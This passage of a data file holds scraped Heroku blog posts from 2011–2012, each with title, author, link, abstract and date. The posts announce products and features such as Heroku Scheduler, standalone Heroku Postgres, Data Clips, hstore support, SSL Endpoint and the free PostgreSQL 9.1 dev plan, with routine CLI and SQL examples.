"2011-10-24,"},
{"website": "Heroku", "title": "Heroku Scheduler Add-on Now Available", "author": ["Mark Pundsack"], "link": "https://blog.heroku.com/heroku_scheduler_add_on_now_available", "abstract": "Heroku Scheduler Add-on Now Available Posted by Mark Pundsack November 11, 2011 Listen to this article Today we're happy to announce the availability of Heroku Scheduler . Scheduler is an add-on for running administrative or maintenance tasks, or jobs, at scheduled time intervals. It's the polyglot replacement of the Cron add-on, with more power and flexibility. And it's free; you just pay for the dyno time consumed by the one-off tasks . A dashboard allows you to configure jobs to run every 10 minutes, every hour, or every day, and unlike the Cron add-on, you can control when. E.g. Every hour on the half-hour, or every day at 7:00am. Polyglot Tasks Tasks are any command that can be run in your application or even the Unix shell. For Rails, the convention is to set up rake tasks. To create your scheduled tasks in Rails, copy the code below into lib/tasks/scheduler.rake and customize it to fit your needs. desc \"This task is called by the Heroku scheduler add-on\"\ntask :update_feed => :environment do\n    puts \"Updating feed...\"\n    NewsFeed.update\n    puts \"done.\"\nend\n\ntask :send_reminders => :environment do\n    User.send_reminders\nend If you're using Python with the popular Fabric automation tool, you can define a fab clean_sessions task: from fabric.api import task\n\n@task\ndef clean_sessions():\n    url = urlparse(os.environ.get('REDISTOGO_URL'))\n    db = redis.Redis(host=url.hostname, port=url.port, password=url.password)\n    db.delete('myapp:sessions')\n    print 'done.' For apps built on other frameworks or languages, another convention is to add a script to bin/ that will perform the task. E.g. bin/updater . Scheduling Jobs To schedule a frequency and time for a job, open the scheduler dashboard by finding the app in My Apps , clicking \"General Info\", then selecting \"Scheduler\" from the Add-ons dropdown. On the Scheduler Dashboard, click \"Add Job...\", enter a task, select a frequency and next run time. Note that the next run time for daily jobs is in UTC. If you want to schedule the job at a certain local time, add the proper UTC offset. For example, add rake update_feed , select \"Hourly\" and \":30\" to update feeds every hour on the half-hour. Then add rake send_reminders , select \"Daily\" and \"00:00\" to send reminders every day at midnight. Migrating From the Cron Add-on Existing Cron add-on users should migrate to Heroku Scheduler as soon as possible. It has more functionality, is easier to use, and is free. Cron is restricted to running a single command, rake cron and does not provide control over when daily and hourly tasks are run. Scheduler can do everything the Cron add-on does, and more. If you want your new jobs to be scheduled as close as possible to when your Cron jobs would run, go to the Cron dashboard and look at the \"Scheduled for\" information. Then in the Scheduler dashboard, create a new task, set it to be either hourly or daily, and then set the Next Run field to the selection closest to the previous scheduled time. Set the task to rake cron . scheduler addons", "date": "2011-11-11,"},
{"website": "Heroku", "title": "Heroku Postgres Launches", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/heroku_postgres_launches", "abstract": "Heroku Postgres Launches Posted by James Lindenbaum November 22, 2011 Listen to this article Heroku's Postgres database service, the origins of which date back to 2007, is one of the most battle-tested cloud database services around. Over the last year, our growing data team has done an amazing job of dramatically increasing the scale, reliability, and durability of the service - now boasting 99.99% (measured) uptime and over 400 million write-transactions per day. Until now, the service has only been available to Heroku customers, but today we are pleased to announce the launch of Heroku Postgres as a standalone database service .  Included in this launch is a new web interface for managing databases, as well as rock-solid durability based on Continuous Protection technology.  Best of all, these improvements are effective immediately for all existing users of the Heroku Postgres add-on . To learn more, check out the inaugural post of the new Heroku Postgres blog .  Future posts to this blog will contain product updates and articles about leveraging the advantages of PostgreSQL.", "date": "2011-11-22,"},
{"website": "Heroku", "title": "Announcing Heroku Postgres", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/announcing_heroku_postgres", "abstract": "Announcing Heroku Postgres Posted by Matthew Soldo November 22, 2011 Listen to this article Until now, Heroku's Postgres database service - originally launched in 2007 - has only been available to Heroku customers for use with Heroku platform apps.  Today we're excited to announce the launch of Heroku Postgres as a standalone service. With measured service uptime of four nines (99.99%), and designed data durability of eleven nines (99.999999999%), the service is trustworthy for mission-critical data.  As of today, these production-quality Heroku Postgres databases are independently available for use from any cloud platform, provisioned instantly, metered by the second, and without contract. Battle Tested Heroku Postgres has successfully and safely written 19 billion customer transactions, and another 400 million write-transactions are processed every day.  Leverage Heroku's scale and expertise while enabling your team to focus on building great apps rather than managing and configuring databases. Continuous Protection The safety and durability of your data is our number one priority. Continuous Protection is a set of technologies designed to prevent any kind of data loss even in the face of catastrophic failures.  Taking advantage of PostgreSQL's WAL (write-ahead-log of each change to the database's data or schema), Heroku Postgres creates multiple, geographically distributed copies of all data changes as they are written.  These copies are constantly checked for consistency and corruption.  If a meteor were to wipe out the east coast, you won't lose your data.  Continuous Protection come standard with every database running on Heroku Postgres. 100% Pure PostgreSQL We believe deeply in the value of open-source software, and believe it is even more critical in the context of a database service. We are committed to running off-the-shelf, community PostgreSQL - unforked and unmodified. Rest assured that any standard libpq client will run flawlessly on our service. Should you ever decide that you want to go back to being your own DBA, you can; there is no technical lock-in. Great Tools for Visibility and Productivity Heroku Postgres has a rich API, accessible via command-line tools and a clean and simple web-based UI.  Use it for provisioning, generating connection strings, viewing usage statistics, and capturing snapshots. These tools work for both standalone databases and those attached to Heroku apps. The best way to learn more about the service is to give it a try, so check out postgres.heroku.com to signup and provision a database today. postgres", "date": "2011-11-22,"},
{"website": "Heroku", "title": "Deploy Grails Applications on Heroku", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/grails", "abstract": "Deploy Grails Applications on Heroku Posted by Jesper Joergensen December 15, 2011 Listen to this article We're happy to announce the public beta of Grails application deployment on Heroku with support for Grails 1.3.7 and 2.0 provided by the open source Heroku Grails buildpack . Grails is a high-productivity web application framework for the JVM based on the Groovy programming language and featuring many similarities with Rails. Since its inception in 2006, the framework has enjoyed broad adoption in the Java community as it combines the strengths of the JVM and richness of the Java platform with the productivity benefits of modern frameworks like Rails. Today the Grails team announced Grails 2.0 , the latest incarnation of the framework. It features numerous large improvements including an overhauled command line tool, faster and more reliable reloads, and static asset support. Details are covered in the What's New section of the Grails docs. The release includes the Grails Heroku plugin that provides simple commands to set up your Grails app with Heroku add-on services like Postgres , Memcached , Redis , MongoDB from MongoLabs or MongoHQ and RabbitMQ . Deploying a Grails app on Heroku Create a new Grails project: $ grails createApp HelloWorld\n| Created Grails Application at /Users/jjoergensen/dev/HelloWorld\n$ cd HelloWorld Commit to Git: $ grails integrate-with --git\n$ git init\nInitialized empty Git repository in /Users/jjoergensen/dev/HelloWorld/.git/\n$ git add .\n$ git commit -m init\n[master (root-commit) bd0f36b] init\n 58 files changed, 2788 insertions(+), 0 deletions(-)\n create mode 100644 .classpath\n create mode 100644 .gitignore\n create mode 100644 .project\n... Create Heroku Cedar app: $ heroku create --stack cedar\nCreating smooth-night-8061... done, stack is cedar\nhttp://smooth-night-8061.herokuapp.com/ | git@heroku.com:smooth-night-8061.git\nGit remote heroku added Deploy to Heroku: $ git push heroku master\nCounting objects: 73, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (69/69), done.\nWriting objects: 100% (73/73), 97.82 KiB, done.\nTotal 73 (delta 2), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Grails app detected\n-----> Grails 2.0.0 app detected\n-----> Installing Grails 2.0.0..... done\n-----> executing grails -plain-output -Divy.default.ivy.user.dir=/app/tmp/repo.git/.cache war\n\n       |Loading Grails 2.0.0.\n       ...\n       |Done creating WAR target/HelloWorld-0.1.war\n-----> No server directory found. Adding jetty-runner 7.5.4.v20111024 automatically.\n-----> Discovering process types\n       Procfile declares types  -> (none)\n       Default types for Grails -> web\n-----> Compiled slug size is 30.6MB\n-----> Launching... done, v3\n       http://smooth-night-8061.herokuapp.com deployed to Heroku Learn More Getting started with Grails on Heroku How Heroku works Sign up for a Heroku account. It's free to get started. Learn more about Grails The Heroku Grails buildpack", "date": "2011-12-15,"},
{"website": "Heroku", "title": "InfoWorld Names Heroku a 2012 Technology of the Year", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/infoworld_names_heroku_a_2012_technology_of_the_year", "abstract": "InfoWorld Names Heroku a 2012 Technology of the Year Posted by Adam Wiggins January 19, 2012 Listen to this article InfoWorld has named Heroku as a 2012 Technology of the Year .  While we're not normally much for industry awards, we feel honored to be included alongside past winners such as the iPad, Android, Visual Studio, and Eclipse; and this year's winners, including Amazon Web Services, Node.js, Hadoop, CloudBees, and Heroku add-on provider Rhomobile . InfoWorld is a venerable publication in the technology world, and this is the first time they've given awards in the cloud space.  We see this as another major point of validation for platform-as-a-service, and cloud technologies more generally.  2011 was the year that PaaS came into the greater collective consciousness of the technology industry.  We can't wait to see how things will unfold in 2012.", "date": "2012-01-19,"},
{"website": "Heroku", "title": "PostgreSQL 9.1 Available in Beta", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/postgresql_91_available_in_beta", "abstract": "PostgreSQL 9.1 Available in Beta Posted by Matthew Soldo January 18, 2012 Listen to this article One of the benefits of consuming a database through Heroku Postgres is that we are continually improving the service. This benefit is compounded by the fact that our service is based on PostgreSQL , a vibrant and active open source project. The release of PostgreSQL 9.1 had added a number of feature, performance and reliability improvements . These are available today with our beta support for PostgreSQL 9.1. We have been testing and watching PostgreSQL 9.1 since it became available in September. With the recent release of 9.1.2, it is now ready for prime time on Heroku. Test out PG 9.1 right now with: $ heroku addons:add heroku-postgresql version=9.1 PostgreSQL 9.1 can also be selected when provisioning a database through our web-based control surface . Although PostgreSQL 9.1 has been tested internally by Heroku for some time, there is always a risk that beta services will have unforeseen problems. Please be extremely conservative in moving production applications. Performance Improvements Most Heroku Postgres users will see an immediate performance boost upon upgrading to PostgreSQL 9.1. Optimizations in file system writes will result in reduced latency on typical production database loads. In addition, unlogged tables create a variety of interesting new use cases. Unlogged tables are not written to disk and offer extremely fast performance (up to 5x write speeds in some cases). They are well suited to ephemeral data such as work queues. Please note that unlogged tables are not replicated to followers. The data in unlogged tables does not survive a database restart or failure. Upgrade Path and Roadmap PostgreSQL 9.1 is available in beta as an option on all new databases. If you test it, please send feedback to data-feedback@heroku.com . Once PostgreSQL 9.1 has been run for a sufficient amount of time with a variety of customer databases, it will be placed into general availability and will become the default for all new databases. Existing users of Heroku Postgres will continue to run PostgreSQL 9.0. As a policy, we do not upgrade running databases unless there is a security vulnerability. Existing databases can be upgraded by capturing a snapshot of the database and restoring it to a new database. postgres", "date": "2012-01-18,"},
{"website": "Heroku", "title": "Small Change, Big Win", "author": ["Harold Giménez"], "link": "https://blog.heroku.com/small_change_big_win", "abstract": "Small Change, Big Win Posted by Harold Giménez February 08, 2012 Listen to this article At the Heroku Department of Data, we are always investigating ways to improve\nthe reliability, security and performance of your database servers. We do this\nby monitoring the entire ecosystem around it; we monitor the reliability of the\nplatform itself, as well as keeping a close eye on the hardware where your data\nis hosted on upstream servers. But this also includes listening to the\ncommunity. We do that by staying involved with our users at developer meetups\nand hackfests, listening closely to support requests to find and resolve common\npatterns of pain, as well as any relevant mailing lists. Whenever we spot a problem, we make it a priority to resolve it. The last such occasion has a story behind it. Just a couple of days ago, we\nfound a user on the PostgreSQL performance\nlist who discovered an improvement to our database Global Unified Configuration\nSettings (GUCs) that, when modified, increased performance of their query\nsignificantly. The GUC involved was random_page_cost . This configuration parameter serves as\na hint that the query planner uses to determine how expensive it is to perform\nrandom seeks from the underlying block device relative to the cost of a\nsequential scan. It turns out that lowering this number on our platform helps\nthe planner make better decisions when it comes to choosing among using an\nindex, which has its own set of costs, or simply fetching data from disk\ndirectly. The day we discovered this improvement, we deployed a change to our\ndatabase configuration settings that will apply to any new database provisioned\nwith us. Because we prioritize stability of running systems, we chose not to deploy this\nchange to all provisioned databases. However, if you'd like to apply this change\nyourself, you can do so by running: ALTER DATABASE <your-db-name> SET random_page_cost = 2.0; A great story of how one person's pain turned into a resolution for our entire\ncustomer base. postgres", "date": "2012-02-08,"},
{"website": "Heroku", "title": "Nezumi 2.0 for Managing Heroku Apps 'on-the-go' Now Available for iPhone", "author": ["Mattt Thompson"], "link": "https://blog.heroku.com/nezumi-2-for-iphone", "abstract": "Nezumi 2.0 for Managing Heroku Apps 'on-the-go' Now Available for iPhone Posted by Mattt Thompson February 21, 2012 Listen to this article Heroku users are known for leading jet-setter lifestyles. It's true! Developers with refined, sophisticated tastes git push to the cloud in order to appreciate the finer things of life: foreign cinema, travel to exotic destinations, and focusing on development instead of configuring system infrastructure. So it's only natural that Heroku developers on-the-go reach for Nezumi . Nezumi is a paid 3rd-party iPhone app created by Marshall Huss that allows you to scale dynos, restart apps, and so much more--perfect for when you're away from your computer. Its latest release adds support for Cedar applications, multiple accounts, a revamped console and log viewer, and a sleek, new app icon, which will look amazing on your home screen. Nezumi can be purchased on the iTunes App Store now at a limited-time introductory price of $4.99. Existing Nezumi customers can download 2.0 as a free upgrade. Nezumi has given us a few promo codes that can be redeemed for a free download. Leave a comment below for a chance to have one e-mailed to you! iOS nezumi app iPhone download", "date": "2012-02-21,"},
{"website": "Heroku", "title": "Simple data sharing with Data Clips", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/simple_data_sharing_with_data_clips", "abstract": "Simple data sharing with Data Clips Posted by Matthew Soldo February 14, 2012 Listen to this article Data clips are available today in beta as a standard feature on all Heroku Postgres databases. When we share information on the Internet, we do so by sharing URLs. We send URLs for locations , books , videos , and even source code . Until now there hasn't been a convenient way to share data inside a database. That's why we're introducing Data Clips. They are a fast and easy way to unlock the data in your database in the form of a secure URL . Data Clips allow the results of SQL queries on a Heroku Postgres database to be easily shared. Simply create a query on postgres.heroku.com , and then share the resulting URL with co-workers, colleagues, or the world. Data clips can be shared through e-mail, Twitter, irc, or any other medium - they are just URLs. The recipients of a data clip are able to view the data in their browser or download it in JSON, CSV, XML, or Microsoft Excel formats. Data changes rapidly in databases. We've created Data Clips with this in mind. They can either be locked to a point in time or set to refresh with live data. When locked to a point in time, data clips are guaranteed to show an unchanging snapshot of data, even if they are viewed hours, days, or years after the clip was created. Alternatively, when data clips are set to \"Now\", they provide a live view into the database. Example To illustrate how data clips work, we created a database containing all of the people with Wikipedia articles (english articles only). This data comes via dbpedia.org (an excellent project which captures the \"structured\" information from Wikipedia). It is a modest, 4.6 GB database. The People table contains 800,000 rows: => \\d people\n              Table \"public.people\"\n   Column    |       Type        | Modifiers                      \n-------------+-------------------+-----------\n id          | integer           | not null\n url         | character varying | \n name        | character varying | \n given_name  | character varying | \n sur_name    | character varying | \n birth_date  | date              | \n death_date  | date              | \n description | character varying | Here are data clips of all of the people whose description contains the words scientist , and artist . We can easily use the power of SQL to summarize this data, grouping and counting each by the century that they were born . We could also create a data clip to show how the average lifespan of wikipedia personalities has changed over time (this clip also exposes some errors in the source data). As you can see, data clips are as expressive as SQL itself. Details Data Clips are immediately available in beta on all Heroku Postgres dedicated databases. Data Clips utilize the excellent Ace Code Editor for SQL entry. To reduce the risk of altering your data, Data Clips query databases within a read-only transaction. Results are limited to 10,000 rows. To limit the load on your database, Data Clips refresh a maximum of once every 60 seconds. postgres", "date": "2012-02-14,"},
{"website": "Heroku", "title": "Java Hackathon", "author": ["Michelle Greer"], "link": "https://blog.heroku.com/heroku-java-contest", "abstract": "Java Hackathon Posted by Michelle Greer February 24, 2012 Listen to this article This weekend, join us for a Java Hackathon at the Heroku office in San Francisco. We've decided to kick things off with a contest. To enter, build a creative and/or useful application that enables or manages interactions with customers or potential customers via social media channels. It can be any social media channel, and your app will be judged on how well it fits the contest criteria as well as the quality of your concept and implementation. The overall winner will receive a $500 Amazon gift card and a $500 Heroku credit.  Two runners up will win a $100 Heroku credit. Here are the basic rules to enter: Your app has to be in Java or a Java framework. You don't have to be at the Hackathon, but you do have to reside in the U.S., Canada (excluding Quebec), or the U.K. To enter, deploy your app to Heroku and post the code to a public repository on GitHub. Email your app name and a link to the Github.com repository to contests@heroku.com with the title of the contest (Heroku for Java Hackathon) in the subject. Entries must be received no later than 11:59pm PST on 3/4/2012. One entry per person. For the official rules of the contest, please see this page . If you have questions, please contact us at contests@heroku.com . This is a good excuse to get familiar with the Heroku platform and how productive you can be by using it. Learn the basics on our Java Dev Center page and of course, we're more than happy to help you if you can make it out to the Hackathon . heroku contest heroku java", "date": "2012-02-24,"},
{"website": "Heroku", "title": "The Heroku Toolbelt", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/the_heroku_toolbelt", "abstract": "The Heroku Toolbelt Posted by Adam Wiggins March 09, 2012 Listen to this article The Heroku Toolbelt is a package of the Heroku CLI, Foreman, and Git — all the tools you need to get started using Heroku at the command line.  The Toolbelt is available as a native installer for OS X, Windows, and Debian/Ubuntu Linux. The Toolbelt has been available since last fall as part of our polyglot platform .  Since then it's matured substantially with a huge amount of user testing, and now even has a shiny new landing page .  Ruby developers can continue to use gem install heroku , but developers in other languages (Python, Java, Clojure, etc) will probably prefer not to have to install Ruby and RubyGems to use Heroku. The installer won't trample your existing install of Git if you have one.  Similarly, although the Heroku CLI uses Ruby under the hood, the Toolbelt packaging isolates all of its libraries so it will not interfere with an existing Ruby setup. The entire Toolbelt is open source . File an issue or, better yet, send a pull request if you see ways that it can be improved.", "date": "2012-03-09,"},
{"website": "Heroku", "title": "PostgreSQL 9.1 Now Default", "author": ["Peter van Hardenberg"], "link": "https://blog.heroku.com/postgresql_91_now_default", "abstract": "PostgreSQL 9.1 Now Default Posted by Peter van Hardenberg March 01, 2012 Listen to this article We're constantly involved in improving Postgres on behalf of our users. That kind of work includes building new features into our platform like data clips, tracking down bugs uncovered by our users and getting them fixed, and working to bring the needs of our users to the attention of the developer community driving the project forward. Of course, all that pales in comparison to the work the community does every day, and there's no bigger demonstration of that than the major PostgreSQL releases which introduce new features and generally come out once a year. When they do, we build support for that version almost immediately, and roll it out to gradually larger audiences as we receive requests, uncover its use cases, and prove it operationally on our own internal projects. I'm pleased to announce that as of today, all new databases created will run PostgreSQL 9.1. There are no known issues with 9.0 compatibility (here are the release notes ), so if you're excited about any of the new functionality, please feel free to upgrade today using pgbackups to migrate your data . Cancelable Queries In addition to making 9.1 the new default, I also wanted to draw your attention to a feature we cherry-picked from the upcoming 9.2 release and made available to all new databases as of today. For most users, queries come and go in an instant, and a slow query is anything that takes longer than a hundred milliseconds. Query cancellation is a problem that really only rears its head once you reach a certain size. For example, occasionally a migration which was instantaneous in your testing environment might surprise you with a long-lasting lock on a table in production and bring your site to its knees. Unfortunately, when our users were faced with this problem in the past, they weren't able to cancel those queries without opening a support ticket. Fortunately, it's no longer a problem. Here's how the solution looks to a user: => SELECT pg_cancel_backend(procpid) \n   FROM pg_stat_activity \n   WHERE current_query LIKE '%your giant accidental query%';\npg_cancel_backend\n-----------------\nt\n=> So how did this get fixed? This exact problem was causing pain to some of our customers with very large datasets. We brought the issue to the Postgres community's attention, and proposed a patch. The patch that eventually became a part of 9.2 ended up being dramatically different (and much better) than the one we put forward, but now because of the feedback we got from our customers and the relationship we have with the Postgres developer community, everyone's database is just a little bit better. postgres", "date": "2012-03-01,"},
{"website": "Heroku", "title": "Introducing key/value data storage in Heroku Postgres", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/introducing_keyvalue_data_storage_in_heroku_postgres", "abstract": "Introducing key/value data storage in Heroku Postgres Posted by Matthew Soldo March 14, 2012 Listen to this article One of the great strengths of PostgreSQL is extensibility. Just as the JVM has become more than a way to just run Java—spawning languages such as Clojure and Scala—PostgreSQL has become more than just a home to relational data and the SQL language. Our first officially supported Postgres extension, hstore , enables you to build better apps faster without sacrificing the power, reliability, and flexibility of the underlying PostgreSQL storage engine. By using hstore, you will be able to leverage the flexibility and agility of schema-less data stores in existing environments. Although hstore is a mature, stable solution, it has recently been gathering widespread excitement: The Durable Document Store You Didn't Know You Had But Did The key value store everyone ignored YC Discussion Support for hstore is available today in many popular languages and frameworks, including plugins for Django , Rails/ActiveRecord , Sequel , and Node.js . While you can be ahead of the curve now, hstore support will become a native part of ActiveRecord 4. You can add hstore to any Postgres 9.1 database today with a single command: => CREATE EXTENSION hstore; Sample hstore App If you want a jumpstart on using hstore, Heroku's Richard Schneeman has created a simple rails app demonstrating its usage. The code is available on Github . An Agile Example Let's imagine that you are building an online bookstore. You might create a products table with only a name, id, and hstore column in order to have maximum flexability as to what is stored in the table: => CREATE TABLE products (\n     id serial PRIMARY KEY,\n     name varchar,\n     attributes hstore\n   ); Then insert any type of data you need into the table: => INSERT INTO products (name, attributes) VALUES (\n    'Geek Love: A Novel',\n    'author    => \"Katherine Dunn\",\n     pages     => 368,\n     category  => fiction'\n    ); Data in an hstore column can be queried based on the values of attributes , => SELECT name, attributes->'device' as device \n   FROM products \n   WHERE attributes->'edition'= 'ebook' or queried based on the keys : => SELECT name, attributes->'pages' \n   FROM products\n   WHERE attributes ? 'pages' Someone you admire tells you that \" nobody reads books anymore \". No problem, pivot! You now sell electronics. That might require a change to your code or brand, but not your schema: =>  INSERT INTO products (name, attributes)\n    VALUES (\n      'Leica M9',\n      'manufacturer  => Leica,\n       type          => camera,\n       megapixels    => 18,\n       sensor        => \"full-frame 35mm\"'\n    ),\n    ( 'MacBook Air 11',\n      'manufacturer  => Apple,\n       type          => computer,\n       ram           => 4GB,\n       storage       => 256GB,\n       processor     => \"1.8 ghz Intel i7 duel core\",\n       weight        => 2.38lbs'\n    ); Of course, you can use the full power of PostgreSQL on this data. Values in hstore can be indexed: => CREATE INDEX product_manufacturer \n   ON products ((products.attributes->'manufacturer')); And used in joins : => SELECT manufacturers.country, products.name\n   FROM products, manufacturers\n   WHERE products.attributes -> 'manufacturer' = manufacturers.name; Conclusion The pace of software development is accelerating. Agile processes, application frameworks, and cloud deployment platforms are force-multipliers driving this change. The PostgreSQL project has seen these trends and is embracing them. Whether your software project has rapidly changing requirements, or inherently doesn't fit with traditional pre-defined schemas (applications dealing with user-generated data for example), hstore may be the solution you are looking for. If you have suggestions for what can be built on top of the Postgres \"platform\", please let us know via @herokupostgres or in a comment below. postgres", "date": "2012-03-14,"},
{"website": "Heroku", "title": "Java Template Apps on Heroku", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/java_template_apps_on_heroku", "abstract": "Java Template Apps on Heroku Posted by Jesper Joergensen March 15, 2012 Listen to this article Editor's Note: The functionality described in this blog post has been replaced by Heroku Button.  The Heroku Elements marketplace now lists hundreds of template apps that can be easily deployed.  Check out Heroku Elements to find an app to deploy. Learning a new language or framework can be both fun and rewarding. But tutorials only get you so far: one of the easiest ways to get started is by copying an existing sample app. Today we're introducing template-based app creation for Java on Heroku. To try it out, go to www.heroku.com/java and click Create App on one of the four templates at the bottom of the page. In seconds, you'll have your own copy of the app deployed and running on Heroku.  You can then clone the app and start editing it in Eclipse or other development environment. We've put together four Java app templates that represent the most popular and most exciting ways to build Java apps today. But Heroku is not limited to these frameworks. Heroku runs 100% open-standards Java, so you can run any Java application and use any framework.  You can even use no framework at all, such as running stand-alone Java processes that are not web applications. Deploy your first Java template app on Heroku today!", "date": "2012-03-15,"},
{"website": "Heroku", "title": "Matz Named 2011 Free Software Award Winner", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/matz-wins-2011-free-software-award", "abstract": "Matz Named 2011 Free Software Award Winner Posted by Richard Schneeman March 30, 2012 Listen to this article We are pleased to announce that Yukihiro \"Matz\" Matsumoto , the creator of Ruby and Heroku's Chief Ruby Architect , has received the 2011 annual Advancement of Free Software Award. ruby matz", "date": "2012-03-30,"},
{"website": "Heroku", "title": "The Heroku Changelog", "author": ["Jon Mountjoy"], "link": "https://blog.heroku.com/the_heroku_changelog", "abstract": "The Heroku Changelog Posted by Jon Mountjoy April 17, 2012 Listen to this article The Heroku Changelog is a feed of all public-facing changes to the Heroku runtime platform.  While we announce all major new features via the Heroku blog, we're making small improvements all the time.  When any of those improvements have any user-visible impact, you'll find them in the changelog. Some recent examples of posts to the changelog include new versions of the Heroku CLI , a new error code , and changes to logging . To get the latest on changes like these, visit the Heroku Changelog , or subscribe via feed or Twitter .", "date": "2012-04-17,"},
{"website": "Heroku", "title": "A Very Good Day For Postgres: Postgres.app, Postgres Guide, and Schemaless SQL", "author": ["Mattt Thompson"], "link": "https://blog.heroku.com/a_very_good_day_for_postgres_postgresapp_postgres_guide_and_schemaless_sql", "abstract": "A Very Good Day For Postgres: Postgres.app, Postgres Guide, and Schemaless SQL Posted by Mattt Thompson April 24, 2012 Listen to this article Today has been a very good day for Postgres. We here at Heroku love Postgres, and we aren't afraid to show it. Here's how three different Herokai showed their PG love in three awesome ways in the last 24 hours: Postgres.app is the easiest way to run PostgreSQL on the Mac. Just open the app, and you have a server up and running with Postgres 9.1 and PostGIS 2.0. PostgreSQL has not been the easiest things to install--especially for new developers--so we see Postgres.app as an important step in making the world's best database more accessible to everyone. Postgres.app was created by Mattt Thompson , and launched in beta today. It will soon be available as a free download in the Mac App Store. From making Postgres easier to install to making it easier to understand, Craig Kerstien's Postgres Guide made its debut on the Hacker News front page to much acclaim. Craig's guide outlines the best features of Postgres in detailed, well-written prose that's easy to understand and a joy to read. It's still early in its development, but there are already some great gems in there, like the chapter on Views , and the articles about Indexes and Execution Plans . Also spreading knowledge was Will Leinweber , who delivered his \"Schemaless SQL\" talk this afternoon at RailsConf in Austin. It was a veritable salvo of enthusiasm and insight; the audience hung on every word as Will demonstrated the power and flexibility of hstore . The often disparate worlds of RDBMS and NoSQL, united as one: it's a beautiful thing. Today was a great day for Postgres, and Postgres can make your day great, too! Check out Postgres.app , Postgres Guide , and the slides about Schemaless SQL today, and prepare to fall in love. postgres", "date": "2012-04-24,"},
{"website": "Heroku", "title": "Announcing Better SSL For Your App", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/announcing_better_ssl_for_your_app", "abstract": "Announcing Better SSL For Your App Posted by Craig Kerstiens May 03, 2012 Listen to this article SSL is a crucial part of any web app with a login session.  As Firesheep demonstrated, HTTPS everywhere is the path forward for modern web apps.  Heroku follows this with our own login-protected apps, from the management interface to the Dev Center to the Toolbelt . Announcing Better SSL For Your App Today, we're announcing two new features to make it as easy as possible for you to secure your app running on Heroku with SSL. First, all apps now have piggyback SSL by default.  Prepend https to the hostname for any Heroku app ( https://yourapp.herokuapp.com for Cedar and https://yourapp.heroku.com for Aspen/Bamboo )  and you'll piggyback on the *.herokuapp.com SSL certificate.  No special configuration is needed, just access the app with https and you're secure by default. Then, for apps running on custom domains, we have a new SSL product that unifies and simplifies our SSL add-on lineup : SSL Endpoint. SSL Endpoint is priced identically to SSL Hostname ($20/mo) but offers these additional benefits: Instant provisioning Client IP address is forwarded to application as X-Forwarded-For Better validation of certificate files Rollback of certificate changes Try It Out SSL Endpoint is easy to use: add the add-on to your app, then upload your certificate and private key. $ heroku addons:add ssl:endpoint\n-----> Adding SSL endpoint to myapp... done, v20 ($20/mo)\n\n$ heroku certs:add final.crt site.key\n-----> Adding certificate to myapp... done. \n       myapp now served by tokyo-2121.herokussl.com. You'll get a unique endpoint hostname, such as tokyo-2121.herokussl.com .  Create a CNAME record to this hostname for your domain, and you're done. In setting up SSL for your custom domain you'll still need to purchase an SSL certificate from a provider elsewhere, and configure your DNS.  The Dev Center now provides guidance on each of these steps: Purchasing an SSL certificate Creating a self-signed certificate for testing purposes Configuring DNS Full docs for SSL Endpoint SSL Endpoint, like SSL Hostname, will not support naked domains. More detail on issues presented with naked domains can be found here . Conclusion With security and privacy as top concerns in this era of digital communication, Heroku wants to make it as easy as possible for your app to be secure and trusted for your users.  The internet is increasingly embracing HTTPS everywhere, and HTTPS on Heroku has never been easier.", "date": "2012-05-03,"},
{"website": "Heroku", "title": "Heroku's new, free PostgreSQL 9.1 development database", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/heroku_postgres_development_plan", "abstract": "Heroku's new, free PostgreSQL 9.1 development database Posted by Matthew Soldo May 01, 2012 Listen to this article Introducing the newest plan in the Heroku Postgres line-up: dev . It is an updated replacement for the PostgreSQL 8.3-based shared database add-on. This plan is available immediately in public beta: $ heroku addons:add heroku-postgresql:dev It can also be provisioned through the Heroku add-ons catalog . What's New? This new dev plan offers increased parity between our free database service and our paid, production plans. New features include: Postgres 9.1 Data clips hstore Direct database access from psql or other libpq clients. Support for most pg commands in the Heroku command line client. Visibility through the web interface at postgres.heroku.com . Support for many databases connected to one application . How does it differ from production plans? The dev plan is designed to offer the database features required for development and testing, without the production-grade operations, monitoring, and support found in our paid plans. Fork, follow, and automatic database backups are not available on the dev plan (manual backups are available on the dev plan). In addition, the dev plan will have a limit on the number of rows that can be stored in the database. This represents a departure from the sized-based limit on our current shared plan, and is due to the fact that data storage layer mechanisms can cause confusing discrepancies relative to what a user would expect, particularly for small data sets. The limit will be set such that databases under the current size limit should be under the record limit as well. Beta Period The dev plan is available for testing in public beta. Although it is not designed for mission-critical data in any case (it is a development plan after all), the risk of data loss or unavailability is increased as a beta product. The dev plan will continue to be free once it has been released from beta. What does it replace? Once out of beta, the dev plan will replace the Postgres 8.3-based shared-database plans as the default & free relational database service on Heroku. The $15/month, Postgres 8.3-based 20gb plan continues to be available during this beta. It will also be replaced with a Postgres 9.1-based plan at a comparable price point. It also replaces the private-beta Postgres 9.1-based heroku-shared-postgresql add-on, which is immediately deprecated. Try it and send feedback Try the development plan today: $ heroku addons:add heroku-postgresql:dev And send feedback to dod-feedback@heroku.com or @herokupostgres . postgres", "date": "2012-05-01,"},
